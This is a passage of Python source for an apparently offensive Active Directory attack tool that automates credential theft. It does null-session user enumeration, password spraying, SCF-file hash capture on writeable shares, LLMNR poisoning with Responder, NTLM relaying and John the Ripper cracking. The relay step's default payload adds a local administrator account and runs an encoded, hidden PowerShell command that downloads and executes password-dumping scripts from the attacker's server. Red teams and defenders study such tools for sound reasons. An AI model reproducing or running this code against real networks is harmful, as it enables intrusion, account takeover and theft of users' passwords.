#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import os
import sys
import time
import base64
import string
import signal
import random
import asyncio
import libtmux
import requests
import argparse
import netifaces
import http.server
import socketserver
from threading import Thread
from datetime import datetime
from termcolor import colored
from libnmap.process import NmapProcess
from asyncio.subprocess import PIPE, STDOUT
from netaddr import IPNetwork, AddrFormatError
from subprocess import Popen, PIPE, CalledProcessError
from libnmap.parser import NmapParser, NmapParserException
from http.server import HTTPServer as BaseHTTPServer, SimpleHTTPRequestHandler

# Debug
from IPython import embed

# Disable the InsecureRequests warning and the 'Starting new HTTPS connection' log message
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Prevent JTR error in VMWare
os.environ['CPUID_DISABLE'] = '1'

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-x", "--xml", help="Path to Nmap XML file")
    parser.add_argument("-p", "--password-list", help="Path to password list file for attack 1's reverse bruteforce")
    parser.add_argument("-s", "--skip", default='', help="Skip [rid/scf/responder/ntlmrelay/dns/crack] where the first 5 options correspond to attacks 1-5")
    parser.add_argument("-t", "--time", default='10', help="Number of minutes to run the LLMNR/Responder attack; defaults to 10m")
    parser.add_argument("-i", "--interface", help="Interface to use with Responder")
    parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
    parser.add_argument("-d", "--domain", help="Domain to use with theHarvester to gather usernames for reverse bruteforce, e.g., google.com")
    parser.add_argument("--port", type=int, default=443, help="Port to run the webserver on; the webserver serves Mimikatz and PowerDump in attack 4 and 5")
    parser.add_argument("--auto", help="Start up Empire and DeathStar to automatically get domain admin using [xterm/tmux], defaults to tmux, e.g., --auto xterm")
    return parser.parse_args()

# Colored terminal output
def print_bad(msg):
    print(colored('[-] ', 'red') + msg)

def print_info(msg):
    print(colored('[*] ', 'blue') + msg)

def print_good(msg):
    print(colored('[+] ', 'green') + msg)

def print_great(msg):
    print(colored('[!] {}'.format(msg), 'yellow', attrs=['bold']))

def parse_nmap(args):
    '''
    Either performs an Nmap scan or parses an Nmap xml file
    Will either return the parsed report or exit script
    '''
    if args.xml:
        try:
            report = NmapParser.parse_fromfile(args.xml)
        except FileNotFoundError:
            print_bad('Host file not found: {}'.format(args.xml))
            sys.exit()

    elif args.hostlist:
        hosts = []
        with open(args.hostlist, 'r') as hostlist:
            host_lines = hostlist.readlines()
            for line in host_lines:
                line = line.strip()
                try:
                    if '/' in line:
                        hosts += [str(ip) for ip in IPNetwork(line)]
                    elif '*' in line:
                        print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                        sys.exit()
                    else:
                        hosts.append(line)
                except (OSError, AddrFormatError):
                    print_bad('Error importing host list file. Are you sure you chose the right file?')
                    sys.exit()

        report = nmap_scan(hosts)

    else:
        print_bad('Use the "-x [path/to/nmap-output.xml]" option if you already have an Nmap XML file \
or "-l [hostlist.txt]" option to run an Nmap scan with a hostlist file.')
        sys.exit()

    return report

def nmap_scan(hosts):
    '''
    Do Nmap scan
    '''
    nmap_args = '-sS --script smb-security-mode,smb-enum-shares -n --max-retries 5 -p 445,3268 -oA icebreaker-scan'
    nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
    rc = nmap_proc.sudo_run_background()
    nmap_status_printer(nmap_proc)
    report = NmapParser.parse_fromfile(os.getcwd()+'/icebreaker-scan.xml')

    return report

def nmap_status_printer(nmap_proc):
    '''
    Prints that Nmap is running
    '''
    i = -1
    x = -.5
    while nmap_proc.is_running():
        i += 1
        # Every 30 seconds print that Nmap is still running
        if i % 30 == 0:
            x += .5
            print_info("Nmap running: {} min".format(str(x)))

        time.sleep(1)
    if nmap_proc.rc != 0:
        print_bad(nmap_proc.stderr)
        sys.exit()

def run_nse_scripts(args, hosts):
    '''
    Run NSE scripts if they weren't run in supplied Nmap XML file
    '''
    host_ips = []
    if len(hosts) > 0:
        for h in hosts:
            host_ips.append(h.address)
        print_info("Running missing NSE scripts")
        report = nmap_scan(host_ips)
        new_hosts, DCs = get_hosts(args, report)
        return new_hosts, DCs
    else:
        print_bad('No hosts found')
        sys.exit()

def get_share(l, share):
    '''
    Gets the share from Nmap output line
    e.g., \\\\192.168.1.10\\Pictures
    '''
    if l.startswith('  \\\\'):
        share = l.strip()[:-1]
    return share

def parse_nse(hosts, args, iface):
    '''
    Parse NSE script output
    '''
    smb_signing_disabled_hosts = []
    anon_share_found = False

    if 'scf' not in args.skip.lower():
        print()
        print_info('Attack 2: SCF file upload to anonymously writeable shares for hash collection')

    for host in hosts:
        ip = host.address

        # Get SMB signing data
        for script_out in host.scripts_results:
            if script_out['id'] == 'smb-security-mode':
                if 'message_signing: disabled' in script_out['output']:
                    smb_signing_disabled_hosts.append(ip)

            # ATTACK 2: SCF file upload for hash capture
            if 'scf' not in args.skip.lower():
                if script_out['id'] == 'smb-enum-shares':
                    lines = script_out['output'].splitlines()
                    anon_share_found = write_scf_files(lines, ip, args, anon_share_found, iface)
                    local_scf_cleanup()

    if 'scf' not in args.skip.lower():
        if anon_share_found == False:
            print_bad('No anonymously writeable shares found')

    if len(smb_signing_disabled_hosts) > 0:
        old_lines = None
        filename = 'smb-signing-disabled-hosts.txt'
        if os.path.isfile(filename):
            f = open(filename, 'r')
            old_lines = f.readlines()
            f.close()

        for host in smb_signing_disabled_hosts:
            host = host + '\n'
            # Slow, fix file write later
            if old_lines:
                if host not in old_lines:
                    write_to_file(filename, host, 'a+')
            else:
                write_to_file(filename, host, 'a+')


        return True

    else:

        return False

def run_smbclient(server, share_name, action, scf_filepath):
    '''
    Run's impacket's smbclient.py for scf file attack
    '''
    smb_cmds_filename = 'smb-cmds.txt'
    smb_cmds_data = 'use {}\n{} {}\nls\nexit'.format(share_name, action, scf_filepath)
    write_to_file(smb_cmds_filename, smb_cmds_data, 'w+')
    smbclient_cmd = 'python2 {}/submodules/impacket/examples/smbclient.py {} -f {}'.format(os.getcwd(), server, smb_cmds_filename)
    print_info("Running '{}' with the verb '{}'".format(smbclient_cmd, action))
    stdout, stderr = Popen(smbclient_cmd.split(), stdout=PIPE, stderr=PIPE).communicate()

    return stdout, stderr

def write_scf_files(lines, ip, args, anon_share_found, iface):
    '''
    Writes SCF files to writeable shares based on Nmap smb-enum-shares output
    '''
    # lines = just all the nmap script output for one host
    share = None
    shares_written_to = []
    scf_filepath = create_scf(iface)

    for l in lines:
        share = get_share(l, share)
        if share:
            share_folder = share.split('\\')[-1]
            if 'Anonymous access:' in l or 'Current user access:' in l:
                access = l.split()[-1].strip()

                if access == 'READ/WRITE' and share not in shares_written_to:
                    if '$' not in share:
                        # We only want to check if a single anon share is found
                        # for later "no anon shares found" msg
                        if anon_share_found == False:
                            anon_share_found = True

                        print_good('Writeable share found at: '+share)
                        print_info('Attempting to write SCF file to share')

                        action = 'put'
                        stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
                        stdout = stdout.decode('utf-8')

                        err_strings = ['Error:', 'Errno']
                        if not any(x in stdout for x in err_strings) and len(stdout) > 1:
                            print_good('Successfully wrote SCF file to: {}'.format(share))
                            write_to_file('logs/shares-with-SCF.txt', share + '\n', 'a+')
                            shares_written_to.append(share)
                        else:
                            stdout_lines = stdout.splitlines()
                            for line in stdout_lines:
                                if 'Error:' in line:
                                    print_bad('Error writing SCF file: \n    '+line.strip())

    return anon_share_found

def create_scf(iface):
    '''
    Creates scf file and smbclient.py commands file
    '''
    scf_filename = '@local.scf'

    if not os.path.isfile(scf_filename):
        scf_data = '[Shell]\r\nCommand=2\r\nIconFile=\\\\{}\\file.ico\r\n[Taskbar]\r\nCommand=ToggleDesktop'.format(get_local_ip(iface))
        write_to_file(scf_filename, scf_data, 'w+')

    cwd = os.getcwd()+'/'
    scf_filepath = cwd+scf_filename

    return scf_filepath

def local_scf_cleanup():
    '''
    Removes local SCF file and SMB commands file
    '''
    timestamp = str(time.time())
    scf_file = '@local.scf'
    smb_cmds_file = 'smb-cmds.txt'
    shares_file = 'logs/shares-with-SCF.txt'

    if os.path.isfile(scf_file):
        os.remove('@local.scf')

    if os.path.isfile(smb_cmds_file):
        os.remove('smb-cmds.txt')

    if os.path.isfile(shares_file):
        os.rename(shares_file, shares_file+'-'+timestamp)

def get_hosts(args, report):
    '''
    Gets list of hosts with port 445 or 3268 (to find the DC) open
    and a list of hosts with smb signing disabled
    '''
    hosts = []
    DCs = []

    print_info('Parsing hosts')
    for host in report.hosts:
        if host.is_up():
            # Get open services
            for s in host.services:
                if s.port == 445:
                    if s.state == 'open':
                        if host not in hosts:
                            hosts.append(host)
                elif s.port == 3268:
                    if s.state == 'open':
                        if host not in DCs:
                            DCs.append(host)

    if len(hosts) == 0:
        print_bad('No hosts with port 445 open')
        sys.exit()

    return hosts, DCs

@asyncio.coroutine
def get_output(cmd):
    '''
    Performs async OS commands
    '''
    p = yield from asyncio.create_subprocess_shell(cmd, stdout=PIPE, stderr=PIPE)
    # Output returns in byte string so we decode to utf8
    out = (yield from p.communicate())[0].decode('utf8')
    return out

def async_get_outputs(loop, commands):
    '''
    Asynchronously run commands and get get their output in a list
    Runs commands in a pool of 10 workers
    '''
    output = []
    coros = []

    if len(commands) == 0:
        return output

    # Get commands output in parallel
    worker_count = len(commands)
    if worker_count > 10:
        worker_count = 10

    # Pool of 10 workers
    if len(commands) > 0:
        while len(commands) > 0:
            for i in range(worker_count):
                # Prevents crash if [commands] isn't divisible by worker count
                if len(commands) > 0:
                    cmd = commands.pop()
                    coros.append(get_output(cmd))

            # Curiously, tons of the output is None here even though its never None in get_output(cmd)
            output += loop.run_until_complete(asyncio.gather(*coros))

    return output

def coros_pool(worker_count, commands):
    '''
    A pool without a pool library
    '''
    coros = []
    if len(commands) > 0:
        while len(commands) > 0:
            for i in range(worker_count):
                # Prevents crash if [commands] isn't divisible by worker count
                if len(commands) > 0:
                    cmd = commands.pop()
                    coros.append(get_output(cmd))

def create_cmds(hosts, cmd):
    '''
    Creates the list of comands to run
    cmd looks likes "echo {} && rpcclient ... {}"
    '''
    commands = []
    for host in hosts:
        # Most of the time host will be Nmap object but in case of null_sess_hosts
        # it will be a list of strings (ips)
        if type(host) is str:
            ip = host
        else:
            ip = host.address
        formatted_cmd = 'echo {} && '.format(ip) + cmd.format(ip)
        commands.append(formatted_cmd)
    return commands

def get_null_sess_hosts(output):
    '''
    Gets a list of all hosts vulnerable to SMB null sessions
    '''
    null_sess_hosts = {}
    # output is a list of rpcclient output
    for out in output:
        if out:
            if 'Domain Name:' in out:
                out = out.splitlines()
                ip = out[0]
                             # Just get domain name
                dom = out[1].split()[2]
                             # Just get domain SID
                dom_sid = out[2].split()[2]
                null_sess_hosts[ip] = (dom, dom_sid)

    return null_sess_hosts

def get_AD_domains(null_sess_hosts):
    '''
    Prints the unique domains
    '''
    uniq_doms = []

    for key,val in null_sess_hosts.items():
        dom_name = val[0]

        if dom_name not in uniq_doms:
            uniq_doms.append(dom_name)

    if len(uniq_doms) > 0:
        for d in uniq_doms:
            print_good('Domain found: ' + d)

    return uniq_doms

def get_usernames(ridenum_output, prev_users):
    '''
    Gets usernames from ridenum output
    ip_users is dict that contains username + IP info
    prev_users is just a list of the usernames to prevent duplicate bruteforcing
    '''
    ip_users = {}

    for host in ridenum_output:
        out_lines = host.splitlines()
        ip = out_lines[0]
        for line in out_lines:
                                          # No machine accounts
            if 'Account name:' in line and "$" not in line:
                user = line.split()[2].strip()
                if user not in prev_users:
                    prev_users.append(user)
                    print_good('User found: ' + user)

                    if ip in ip_users:
                        ip_users[ip] += [user]
                    else:
                        ip_users[ip] = [user]

    return ip_users, prev_users

def write_to_file(filename, data, write_type):
    '''
    Write data to disk
    '''
    with open(filename, write_type) as f:
        f.write(data)

def create_brute_cmds(ip_users, passwords):
    '''
    Creates the bruteforce commands
    ip_users = {ip:[user1,user2,user3]}
    ip_users should already be unique and no in prev_users
    '''
    cmds = []

    for ip in ip_users:
        for user in ip_users[ip]:
            for pw in passwords:
                cmd = "echo {} && rpcclient -U \"{}%{}\" {} -c 'exit'".format(ip, user, pw, ip)
                # This is so when you get the output from the coros
                # you get the username and pw too
                cmd2 = "echo '{}' ".format(cmd)+cmd
                # This replaces the echo'd command with extra slashes so Python doesn't interpret
                # the DOM\user string as a special char (\a,\b,\f,\n,\r,\t,\v)
                # These chars get printed as stuff like LAB\x08ob instead of LAB\bob
                cmd2 = cmd2.replace('\\','\\\\',1)
                cmds.append(cmd2)

    return cmds

def log_users(user):
    '''
    Writes users found to log file
    '''
    with open('found-users.txt', 'a+') as f:
        f.write(user+'\n')

def create_passwords(args):
    '''
    Creates the passwords based on default AD requirements
    or user-defined values
    '''
    if args.password_list:
        with open(args.password_list, 'r') as f:
            # We have to be careful with .strip()
            # because password could contain a space
            passwords = [line.replace('\n', '') for line in f]
    else:
        season_pw = create_season_pw()
        other_pw = "P@ssw0rd"
        passwords = [season_pw, other_pw]

    return passwords

def create_season_pw():
    '''
    Turn the date into the season + the year
    '''
    # Get the current day of the year
    doy = datetime.today().timetuple().tm_yday
    year = str(datetime.today().year)

    spring = range(80, 172)
    summer = range(172, 264)
    fall = range(264, 355)
    # winter = everything else

    if doy in spring:
        season = 'Spring'
    elif doy in summer:
        season = 'Summer'
    elif doy in fall:
        season = 'Fall'
    else:
        season = 'Winter'

    season_pw = season+year
    return season_pw

def parse_brute_output(brute_output, prev_creds):
    '''
    Parse the chunk of rpcclient attempted logins
    '''
    # prev_creds = ['ip\user:password', 'SMBv2-NTLMv2-SSP-1.2.3.4.txt']
    pw_found = False

    for line in brute_output:
        # gathering the coroutines leads to tons of None in output
        if line:
            # Missing second line of output means we have a hit
            if len(line.splitlines()) == 1:
                pw_found = True
                split = line.split()
                ip = split[1]
                dom_user_pwd = split[5].replace('"','').replace('%',':')
                if dom_user_pwd not in prev_creds:
                    prev_creds.append(dom_user_pwd)
                host_dom_user_pwd = ip+'\\'+dom_user_pwd

                duplicate = check_found_passwords(dom_user_pwd)
                if duplicate == False:
                    # if its an AD account just print the AD creds
                    if '\\' in dom_user_pwd:
                        print_great('Password found! '+dom_user_pwd)
                    # if it's a local account then print the IP and creds
                    else:
                        print_great('Password found! '+host_dom_user_pwd)
                    log_pwds([host_dom_user_pwd])

    if pw_found == False:
        print_bad('No reverse bruteforce password matches found')

    return prev_creds

def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users, DCs):
    '''
    Performs SMB reverse brute
    '''
    # {ip:'domain name: xxx', 'domain sid: xxx'}
    null_sess_hosts = {}
    ip_users = {}
    domains = []
    dom_cmd = 'rpcclient -U "" {} -N -c "lsaquery"'
    dom_cmds = create_cmds(hosts, dom_cmd)

    print()
    print_info('Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
    print_info('Checking for null SMB sessions')
    print_info('Example command that will run: '+dom_cmds[0].split('&& ')[1])

    rpc_output = async_get_outputs(loop, dom_cmds)

    if rpc_output:

        # {ip:'domain_name', 'domain_sid'}
        null_sess_hosts = get_null_sess_hosts(rpc_output)

        # Create master list of null session hosts
        if len(null_sess_hosts) == 0:
            print_bad('No null SMB sessions available')
        else:
            null_hosts = []
            for ip in null_sess_hosts:
                print_good('Null session found: {}'.format(ip))
                null_hosts.append(ip)

            domains = get_AD_domains(null_sess_hosts)

            # Gather usernames using ridenum.py
            ridenum_output = do_ridenum(loop, null_hosts)

            # ip_users = {ip:[username, username2], ip2:[username, username2]}
            ip_users, prev_users = get_usernames(ridenum_output, prev_users)
            if len(ip_users) == 0:
                print_bad('No usernames found through null SMB session')

    # Do theHarvester for username collection
    if args.domain:
        print_info('Attempting to scrape usernames from {}'.format(args.domain))
        ip_users, prev_users = run_theHarvester(ip_users, prev_users, null_sess_hosts, args.domain, hosts[0].address, DCs)

    if len(ip_users) > 0:
        # Creates a list of unique commands which only tests
        # each username/password combo 2 times and not more
        brute_cmds = create_brute_cmds(ip_users, passwords)

        rev_brute_msgs(ip_users, args, passwords)

        brute_output = async_get_outputs(loop, brute_cmds)

        prev_creds = parse_brute_output(brute_output, prev_creds)

    return prev_creds, prev_users, domains


def do_ridenum(loop, null_hosts):
    '''
    Runs and gathers the output from ridenum
    '''
    print_info('Checking for usernames. This may take a bit...')
    ridenum_cmd = 'python2 '+os.getcwd()+'/submodules/ridenum/ridenum.py {} 500 50000 | tee -a logs/ridenum.log'
    ridenum_cmds = create_cmds(null_hosts, ridenum_cmd)
    print_info('Example command that will run: '+ridenum_cmds[0].split('&& ')[1])
    ridenum_output = async_get_outputs(loop, ridenum_cmds)
    return ridenum_output

def rev_brute_msgs(ip_users, args, passwords):
    '''
    Messages printed to output about details of reverse bruteforce
    '''
    rev_brute_msg = 'Reverse bruteforcing with the passwords '
    if args.password_list:
        print_info(rev_brute_msg + 'in {}'.format(args.password))
    else:
        print_info(rev_brute_msg + '{} and {}'.format(passwords[0], passwords[1]))

    print_info('Testing users against one of the following IPs:'.format(args.password_list))
    for ip in ip_users:
        print_info('    {}'.format(ip))

def run_theHarvester(ip_users, prev_users, null_sess_hosts, domain, host, DCs):
    '''
    Run theHarvester to collect more potential usernames
    '''
    users = []
    cmd = 'python2 {}/submodules/theHarvester/theHarvester.py -d {} -b all'.format(domain, os.getcwd())
    rid_users = False
    unallowed_AD_chars = ['/','\\','[',']',':',';','|','=','+','*','?','<','>','"','@']
    if len(ip_users) > 0:
        rid_users = True
    proc = run_proc(cmd)
    proc.wait()

    with open('logs/theHarvester.py.log', 'r') as f:
        lines = f.readlines()

    for l in lines:

        if '@' in l and 'cmartorella@edge-security.com' not in l:

            user = l.split('@')[0]

            # make sure no unallowed AD username character is in the web scraped user
            if any(char in unallowed_AD_chars for char in user):
                continue
            # Max SAM-Account-Name length is 20
            if len(user) > 20:
                continue

            if user not in prev_users:
                prev_users.append(user)
                users.append(user)
                print_good('Potential user found: {}'.format(user))

            # First check if we ID'd any DCs
            # If so, brute one because they don't require knowledge of the domain name
            if len(DCs) > 0:
                # Just grab the first DC we found
                # Ideally we'd run this against every DC with a different domain but
                # hard to make that work without prior knowledge of what the domains are named
                ip = DCs[0].address
                if ip_users.get(ip):
                    ip_users[ip].append(user)
                else:
                    ip_users[ip] = [user]

            # If we have AD domains found but no DCs, use them so user = DOM\user
            elif len(null_sess_hosts) > 0:
                for key,val in null_sess_hosts.items():
                    ip = key
                    dom = val[0]
                    dom_user = dom+'\\'+user

                    # This is where we're preventing duplicates in case there's lots of null sess hosts
                    if dom_user not in prev_users:
                        prev_users.append(user)
                        if ip_users.get(ip):
                            ip_users[ip].append(dom_user)
                        else:
                            ip_users[ip] = [dom_user]

            # No null session hosts found, no DCs found
            # Just use the first host with port 445 open
            else:
                if ip_users.get(host):
                    ip_users[host].append(user)
                else:
                    ip_users[host] = [user]

    if len(users) == 0:
        print_bad('No potential usernames found on {}'.format(args.domain))

    return ip_users, prev_users

def log_pwds(host_user_pwds):
    '''
    Turns SMB password data {ip:[usrr_pw, user2_pw]} into a string
    '''
    for host_user_pwd in host_user_pwds:
        line = host_user_pwd+'\n'
        write_to_file('found-passwords.txt', line, 'a+')

def edit_responder_conf(switch, protocols):
    '''
    Edit responder.conf
    '''
    if switch == 'On':
        opp_switch = 'Off'
    else:
        opp_switch = 'On'
    conf = 'submodules/Responder/Responder.conf'
    with open(conf, 'r') as f:
        filedata = f.read()
    for p in protocols:
        # Make sure the change we're making is necessary
        if re.search(p+' = '+opp_switch, filedata):
            filedata = filedata.replace(p+' = '+opp_switch, p+' = '+switch)
    with open(conf, 'w') as f:
        f.write(filedata)

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

def run_proc(cmd):
    '''
    Runs single commands
    ntlmrelayx needs the -c "powershell ... ..." cmd to be one arg tho
    '''
    # Set up ntlmrelayx commands
    # only ntlmrelayx has a " in it
    dquote_split = cmd.split('"')

    if len(dquote_split) > 1:
        cmd_split = dquote_split[0].split()
        ntlmrelayx_remote_cmd = dquote_split[1]
        cmd_split.append(ntlmrelayx_remote_cmd)
    else:
        cmd_split = cmd.split()

    # mitm6 cmd is 'mitm6' with no options
    if 'mitm6' in cmd_split:
        filename = cmd_split[0] + '.log'
    else:
        for x in cmd_split:
            if 'submodules/' in x:
                filename = x.split('/')[-1] + '.log'
                break

    print_info('Running: {}'.format(cmd))
    f = open('logs/'+filename, 'a+')
    proc = Popen(cmd_split, stdout=f, stderr=STDOUT)

    return proc

def create_john_cmd(hash_format, hash_file):
    '''
    Create JohnTheRipper command
    '''
    #./john --format=<format> --wordlist=<path> --rules <hashfile>
    cmd = []
    path = 'submodules/JohnTheRipper/run/john'
    cmd.append(path)
    form = '--format={}'.format(hash_format)
    cmd.append(form)
    wordlist = '--wordlist=1mil-AD-passwords.txt'
    cmd.append(wordlist)
    #cmd.append('--rules')
    cmd.append(hash_file)
    identifier = hash_file.split('-')[-1].split('.')[0]
    cmd.append('--session={}'.format(identifier))
    john_cmd = ' '.join(cmd)
    return john_cmd

def crack_hashes(hashes):
    '''
    Crack hashes with john
    The hashes in the func args include usernames, domains, and such
    hashes = {'NTLMv1':[hash1,hash2], 'NTLMv2':[hash1,hash2]}
    '''
    procs = []
    identifier = ''.join(random.choice(string.ascii_letters) for x in range(7))

    hash_folder = os.getcwd()+'/hashes'
    if not os.path.isdir(hash_folder):
        os.mkdir(hash_folder)

    if len(hashes) > 0:
        for hash_type in hashes:
            filepath = hash_folder+'/{}-hashes-{}.txt'.format(hash_type, identifier)
            for h in hashes[hash_type]:
                write_to_file(filepath, h, 'a+')

            # Limit hash cracking to 10 instances of JTR at a time
            num_john_procs = get_running_john_procs()
            if num_john_procs > 10:
                continue

            if 'v1' in hash_type:
                hash_format = 'netntlm'
            elif 'v2' in hash_type:
                hash_format = 'netntlmv2'
            john_cmd = create_john_cmd(hash_format, filepath)
            john_proc = run_proc(john_cmd)
            procs.append(john_proc)

    return procs

def get_running_john_procs():
    '''
    Gets number of currently running john procs
    '''
    num_john_procs = 0

    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]

    for pid in pids:
        try:
            proc_cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read().decode('utf8')
            proc_cmd = proc_cmd.replace('\x00',' ')
            if 'submodules/JohnTheRipper/run/john --format=netntlm' in proc_cmd:
                num_john_procs += 1

        # proc has already terminated
        except IOError:
            continue

    return num_john_procs

def parse_john_show(out, prev_creds):
    '''
    Parses "john --show output"
    '''
    for line in out.splitlines():
        line = line.decode('utf8')
        line = line.split(':')
        if len(line) > 3:
            user = line[0]

            # No machine accounts
            if user.endswith('$'):
                continue

            pw = line[1]
            host = line[2]
            host_user_pwd = host+'\\'+user+':'+pw
            if host_user_pwd not in prev_creds:
                prev_creds.append(host_user_pwd)
                duplicate = check_found_passwords(host_user_pwd)
                if duplicate == False:
                    print_great('Password found! '+host_user_pwd)
                    log_pwds([host_user_pwd])

    return prev_creds

def get_cracked_pwds(prev_creds):
    '''
    Check for new cracked passwords
    '''
    hash_folder = os.getcwd()+'/hashes'
    if os.path.isdir(hash_folder):
        dir_contents = os.listdir(os.getcwd()+'/hashes')

        for x in dir_contents:
            if re.search('NTLMv(1|2)-hashes-.*\.txt', x):
                out, err = Popen('submodules/JohnTheRipper/run/john --show hashes/{}'.format(x).split(), stdout=PIPE, stderr=PIPE).communicate()
                if err:
                    print_bad('Error getting cracked hashes: {}'.format(err))
                prev_creds = parse_john_show(out, prev_creds)

    return prev_creds

def check_found_passwords(host_user_pwd):
    '''
    Checks found-passwords.txt to prevent duplication
    '''
    fname = 'found-passwords.txt'
    if os.path.isfile(fname):
        with open(fname, 'r') as f:
            data = f.read()
            if host_user_pwd in data:
                return True

    return False

def start_responder_llmnr(iface):
    '''
    Start Responder alone for LLMNR attack
    '''
    edit_responder_conf('On', ['HTTP', 'SMB'])
    resp_cmd = 'python2 {}/submodules/Responder/Responder.py -wrd -I {}'.format(os.getcwd(), iface)
    resp_proc = run_proc(resp_cmd)
    print_info('Responder-Session.log:')
    return resp_proc

def run_relay_attack(iface, args):
    '''
    Start ntlmrelayx for ntlm relaying
    '''
    edit_responder_conf('Off', ['HTTP', 'SMB'])
    resp_cmd = 'python2 {}/submodules/Responder/Responder.py -wrd -I {}'.format(os.getcwd(), iface)
    resp_proc = run_proc(resp_cmd)

    if args.command:
        remote_cmd = args.command
    elif args.auto:
        remote_cmd = run_empire_deathstar(iface, args)
    else:
        local_ip = get_local_ip(iface)
        text_cmd = "net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/Invoke-Cats.ps1'); Invoke-Cats -pwds; IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/Invoke-Pwds.ps1'); Invoke-Pwds".format(local_ip, str(args.port), local_ip, str(args.port))
        enc_cmd = encode_for_ps(text_cmd)
        remote_cmd = 'powershell -nop -exec bypass -w hidden -enc {}'.format(enc_cmd)

    if os.path.isfile('smb-signing-disabled-hosts.txt'):
        signing_disabled = ' -tf smb-signing-disabled-hosts.txt'
    else:
        signing_disabled = ''

    # I'm aware this can be more elegant but I don't feel like doing it right now (send PRs)
    if args.command == 'default':
        relay_cmd = ('python2 {}/submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
                     ' -of hashes/ntlmrelay-hashes{} -wa 3'.format(os.getcwd(), signing_disabled))
    else:
        relay_cmd = ('python2 {}/submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
                     ' -of hashes/ntlmrelay-hashes{} -wa 3 -c "{}"'.format(os.getcwd(), signing_disabled, remote_cmd))

    ntlmrelay_proc = run_proc(relay_cmd)

    return resp_proc, ntlmrelay_proc

def encode_for_ps(cmd):
    win_b64_cmd = base64.b64encode(cmd.encode('UTF-16LE')).decode('utf-8')
    return win_b64_cmd

def follow_file(thefile):
    '''
    Works like tail -f
    Follows a constantly updating file
    '''
    thefile.seek(0,2)
    while True:
        line = thefile.readline()
        if not line:
            time.sleep(0.1)
            continue
        yield line

def check_ntlmrelay_error(line, file_lines):
    '''
    Checks for ntlmrelay errors
    '''
    if 'Traceback (most recent call last):' in line:
        print_bad('Error running ntlmrelayx:\n')
        for l in file_lines:
            print(l.strip())
        print()
        print_bad('Hit CTRL-C to quit')
        return True
    else:
        return False

def format_mimi_data(dom, user, auth, hash_or_pw, prev_creds):
    '''
    Formats the collected mimikatz data and logs it
    '''
    dom_user_pwd = dom+'\\'+user+':'+auth

    if dom_user_pwd not in prev_creds:
        prev_creds.append(dom_user_pwd)
        duplicate = check_found_passwords(dom_user_pwd)
        if duplicate == False:
            print_great('{} found! {}'.format(hash_or_pw, dom_user_pwd))
            log_pwds([dom_user_pwd])

    return prev_creds

def parse_invoke_powerdump(prev_creds, line):
    line = line.strip()
    if line.count(':') == 6:
        if line[-3:] == ':::':
            split_line = line.split(':')
            user = split_line[0]
            ntlm_hash = split_line[3]
            hash_or_pw = 'Hash'
            user_pwd = user+':'+ntlm_hash
            print_great('{} found! {}'.format(hash_or_pw, user_pwd))
            prev_creds.append(user_pwd)
            log_pwds([user_pwd])

    return prev_creds

def parse_mimikatz(prev_creds, mimi_data, line):
    '''
    Parses mimikatz output for usernames and passwords
    '''
    splitl = line.split(':')
    user = None
    dom = None
    ntlm = None

    if "* Username" in line:
        if mimi_data['user']:
            user = mimi_data['user']
            if user != '(null)' and mimi_data['dom']:
                dom = mimi_data['dom']
                # Prevent (null) and hex passwords from being stored
                if mimi_data['pw']:
                    prev_creds = format_mimi_data(dom, user, mimi_data['pw'], 'Password', prev_creds)
                elif mimi_data['ntlm']:
                    prev_creds = format_mimi_data(dom, user, mimi_data['ntlm'], 'Hash', prev_creds)

        user = splitl[-1].strip()
        if user != '(null)':
            mimi_data['user'] = user
        mimi_data['dom'] = None
        mimi_data['ntlm'] = None
        mimi_data['pw'] = None
    elif "* Domain" in line:
        mimi_data['dom'] = splitl[-1].strip()
    elif "* NTLM" in line:
        ntlm = splitl[-1].strip()
        if ntlm != '(null)':
            mimi_data['ntlm'] = splitl[-1].strip()
    elif "* Password" in line:
        pw = splitl[-1].strip()
        if pw != '(null)' and pw.count(' ') < 15:
            mimi_data['pw'] = splitl[-1].strip()

    return prev_creds, mimi_data

def parse_responder_log(args, prev_lines, prev_creds):
    '''
    Gets and cracks responder hashes
    Avoids getting and cracking previous hashes
    '''
    new_lines = []

    # Print responder-session.log output so we know it's running
    path = 'submodules/Responder/logs/Responder-Session.log'
    if os.path.isfile(path):
        with open(path, 'r') as f:
            contents = f.readlines()

            for line in contents:
                if line not in prev_lines:
                    new_lines.append(line)
                    line = line.strip()
                    print('    [Responder] '+line)
                    prev_creds, new_hash = get_responder_hashes(line, prev_creds)

                    if new_hash:
                        if 'crack' not in args.skip.lower():
                            john_proc = crack_hashes(new_hash)

    prev_creds = get_cracked_pwds(prev_creds)

    return prev_creds, new_lines

def get_responder_hashes(line, prev_creds):
    '''
    Parse responder to get usernames and IPs for 2 pw bruteforcing
    '''
    hash_id = ' Hash     : '
    new_hash = None

    # We add the username in form of 'LAB\user' to prev_creds to prevent duplication
    if hash_id in line:
        ntlm_hash = line.split(hash_id)[-1].strip()+'\n'
